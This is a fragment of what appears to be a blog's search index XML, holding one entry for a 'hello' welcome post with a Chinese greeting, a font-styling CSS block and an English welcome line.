    <link href="/2024/06/10/hello/"/>
    <url>/2024/06/10/hello/</url>
    
    <content type="html"><![CDATA[<p>欢迎来到ArmageddoxA的博客！</p><span id="more"></span><style>  /* 只设置 markdown 字体 */  .markdown-body {    font-family: KaiTi,"Microsoft YaHei",Georgia, sans, serif;    font-size: 30px;  }</style><p>WELCOME TO THE WORLD OF ARMAGEDDONXA</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
